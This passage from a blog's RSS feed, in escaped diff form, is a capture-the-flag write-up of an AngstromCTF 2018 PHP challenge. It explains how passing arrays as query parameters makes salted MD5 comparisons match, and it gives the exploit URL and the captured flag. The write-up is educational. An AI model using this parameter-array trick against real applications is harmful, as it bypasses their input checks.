-    String 1: &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;str1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;font-size: 18pt; margin: 10px 10px 10px 10px&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-    String 2: &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;str2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;font-size: 18pt; margin: 10px 10px 10px 10px&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;font-size: 18pt; margin: 10px 0 10px 0&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;What can we get from it? First condition that will make us closer to the flag is that both fields should be filled.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;After that, we have to make sure that our values are different from each other.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str2&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And we the hashes should be the same in order to get the flag.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;md5&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$salt&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;md5&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$salt&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str2&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;If all condtions are met, then we will be able to get the flag. But how should be able to do it with two different characters producing the same hash? Type juggling is not an option here, as it’s using the strict comparision while comparing hashes so we have to look for something else. Remebering the &lt;a href=&quot;https://www.securify.nl/en/blog/SFY20180101/spot-the-bug-challenge-2018-warm-up.html&quot;&gt;Spot The Bug&lt;/a&gt; challenge, where the vulnerability was in supplying the array, we can have this in mind.&lt;/p&gt;
-
-&lt;p&gt;First condition will be met, as the both arrays will be inputted. After that we have to place different inputs in the arrays as only then the second condition will be met. But what will happen when we concatenate string with an array just as here &lt;code class=&quot;highlighter-rouge&quot;&gt;$salt . $_GET[&quot;str1&quot;]&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$array2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;PHP&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Notice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;Array&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;conversion&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;testArray&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$array2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;PHP&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Notice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;Array&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;conversion&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;testArray&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As you can see, we get the same results. And that’s how we’re going to exploit this challenge.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://web.angstromctf.com:3003/?str1[]=1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;str2[]=2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Look at the url, and look at the flag.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;actf{but_md5_has_charm}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-</description>
-        <pubDate>Fri, 23 Mar 2018 05:00:00 +0100</pubDate>
-        <link>http://localhost:4000/angstromctf-md5/</link>
-        <guid isPermaLink="true">http://localhost:4000/angstromctf-md5/</guid>
       </item>
     
   </channel>
